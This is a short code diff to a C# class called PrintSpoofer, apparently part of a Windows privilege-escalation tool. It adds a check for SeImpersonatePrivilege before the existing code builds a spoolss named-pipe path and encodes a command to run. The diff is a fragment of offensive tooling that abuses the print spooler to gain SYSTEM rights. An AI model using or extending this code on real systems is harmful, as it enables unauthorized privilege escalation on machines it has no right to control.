@@ -20,6 +20,12 @@ internal static class PrintSpoofer
         string executeCmd = null
     )
     {
+        var canSpoof = UserHelper.CheckPrivileges().ContainsKey("SeImpersonatePrivilege");
+        if(!canSpoof){
+            Console.WriteLine("Cannot spoof - SeImpersonatePrivilege is not enabled");
+            return;
+        }
+        
         var computerName = Environment.MachineName;
         var pipe = $"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss";
         byte[] commandBytes = Encoding.Unicode.GetBytes(
